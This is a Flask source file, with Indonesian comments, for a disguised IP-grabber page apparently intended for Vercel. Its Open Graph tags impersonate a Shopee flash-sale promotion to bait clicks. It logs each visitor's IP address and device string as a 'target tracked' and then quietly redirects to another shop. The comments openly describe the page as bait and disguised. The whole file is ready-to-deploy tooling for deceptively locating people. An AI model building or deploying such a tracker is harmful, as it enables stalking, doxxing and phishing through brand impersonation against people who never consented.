from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

# --- KONFIGURASI ---
# Ganti dengan link gambar produk Shopee yang meyakinkan
IMAGE_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRZM8UJbFrJj3aBUHwbnqDmq03S5-BB3tGgXQ&s" 
# Ganti dengan link tujuan (Produk Shopee Asli)
TARGET_URL = "https://www.tokopedia.com" 

# --- TEMPLATE HTML (DISAMARKAN) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Shopee Murah Lebay</title>
    
    <meta property="og:site_name" content="Shopee Indonesia">
    <meta property="og:title" content="Promo Flash Sale - Diskon 90%">
    <meta property="og:description" content="Stok terbatas! Klik untuk klaim voucher sekarang.">
    <meta property="og:image" content="{{ image_url }}">
    <meta property="twitter:card" content="summary_large_image">

    <style>
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #f5f5f5; text-align: center; padding-top: 100px; }
        .spinner { margin: 0 auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #ee4d2d; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #666; margin-top: 20px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <p>Memuat halaman produk...</p>

    <script>
        // Redirect otomatis setelah 1.5 detik
        setTimeout(function() {
            window.location.href = "{{ target_url }}";
        }, 1500);
    </script>
</body>
</html>
"""

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    # 1. LOGGING IP
    # Vercel menggunakan header x-forwarded-for untuk IP asli
    user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    # Print ke Log Vercel (Ini yang nanti Anda cek)
    print(f"!!! TARGET TERLACAK !!! IP: {user_ip} | Device: {user_agent}")

    # 2. TAMPILKAN HALAMAN PANCINGAN
    return render_template_string(HTML_TEMPLATE, image_url=IMAGE_URL, target_url=TARGET_URL)

# Handler untuk Vercel Serverless
# Tidak perlu app.run()